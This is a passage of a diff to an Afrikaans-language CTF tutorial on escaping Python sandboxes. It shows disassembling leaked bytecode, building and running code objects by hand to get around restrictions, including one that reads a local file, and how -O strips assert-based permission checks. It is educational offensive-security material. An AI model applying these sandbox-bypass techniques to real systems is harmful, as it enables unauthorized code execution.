 Merk op dat **as jy nie `dis` kan invoer in die Python-sandbox nie** jy die **bytecode** van die funksie (`get_flag.func_code.co_code`) kan verkry en dit plaaslik **ontbind**. Jy sal nie die inhoud van die gelaaide veranderlikes sien (`LOAD_CONST`) nie, maar jy kan hulle raai vanaf (`get_flag.func_code.co_consts`) omdat `LOAD_CONST` ook die skuif van die gelaaide veranderlike aandui.
+
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -905,10 +978,12 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
+
 ## Kompilering van Python
 
 Nou, laat ons verbeel dat jy op een of ander manier die inligting oor 'n funksie kan **dump** wat jy nie kan **uitvoer** nie, maar jy **moet** dit **uitvoer**.\
 Soos in die volgende voorbeeld, **kan jy toegang kry tot die kode-object** van daardie funksie, maar deur net die disassemble te lees, **weet jy nie hoe om die vlag te bereken** (_verbeel jou 'n meer komplekse `calc_flag` funksie_)
+
 ```python
 def get_flag(some_input):
 var1=1
@@ -921,9 +996,11 @@ return calc_flag("VjkuKuVjgHnci")
 else:
 return "Nope"
 ```
+
 ### Skep die kode-object
 
 Eerstens moet ons weet **hoe om 'n kode-object te skep en uit te voer** sodat ons een kan skep om ons funksie leaked uit te voer:
+
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -942,8 +1019,10 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
+
 {% hint style="info" %}
 Afhanklik van die python weergawe kan die **parameters** van `code_type` 'n **verskillende volgorde** hê. Die beste manier om die volgorde van die parameters in die python weergawe wat jy gebruik te weet, is om die volgende te hardloop:
+
 ```
 import types
 types.CodeType.__doc__
@@ -956,6 +1035,7 @@ types.CodeType.__doc__
 {% hint style="warning" %}
 In die volgende voorbeeld gaan ons al die data neem wat nodig is om die funksie te herskep van die funksie kode objek direk. In 'n **werklike voorbeeld**, is al die **waardes** om die funksie uit te voer **`code_type`** wat **jy sal moet lek**.
 {% endhint %}
+
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -966,12 +1046,14 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
+
 ### Bypass Verdediging
 
 In vorige voorbeelde aan die begin van hierdie pos, kan jy sien **hoe om enige python kode uit te voer met behulp van die `compile` funksie**. Dit is interessant omdat jy **hele skripte kan uitvoer** met lusse en alles in 'n **een-liner** (en ons kon dieselfde doen met **`exec`**).\
 In elk geval, soms kan dit nuttig wees om 'n **gekompilieerde objek** te **skep** op 'n plaaslike masjien en dit uit te voer op die **CTF masjien** (byvoorbeeld omdat ons nie die `compiled` funksie in die CTF het nie).
 
 Byvoorbeeld, laat ons 'n funksie handmatig kompileer en uitvoer wat _./poc.py_ lees:
+
 ```python
 #Locally
 def read():
@@ -998,7 +1080,9 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
+
 Indien jy nie toegang tot `eval` of `exec` het nie, kan jy 'n **korrekte funksie** skep, maar om dit direk aan te roep, sal gewoonlik misluk met: _konstrukteur nie toeganklik in beperkte modus nie_. Jy het dus 'n **funksie buite die beperkte omgewing nodig om hierdie funksie aan te roep.**
+
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1006,14 +1090,15 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
+
 ## Decompiling Compiled Python
 
 Met behulp van gereedskap soos [**https://www.decompiler.com/**](https://www.decompiler.com) kan men die gegeewe saamgestelde Python-kode **decompile**.
 
 **Kyk na hierdie handleiding**:
 
-{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
-[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
+{% content-ref url="../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
+[.pyc.md](../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
 {% endcontent-ref %}
 
 ## Misc Python
@@ -1022,6 +1107,7 @@ Met behulp van gereedskap soos [**https://www.decompiler.com/**](https://www.dec
 
 Python wat uitgevoer word met optimiserings met die parameter `-O` sal `assert`-verklarings verwyder en enige kode wat kondisioneel is op die waarde van **debug**.\
 Daarom, kontroles soos
+
 ```python
 def check_permission(super_user):
 try:
@@ -1030,6 +1116,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
+
 ## Verwysings
 
 * [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
@@ -1041,7 +1128,7 @@ print(f"\nNot a Super User!!!\n")
 
 **Probeer Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
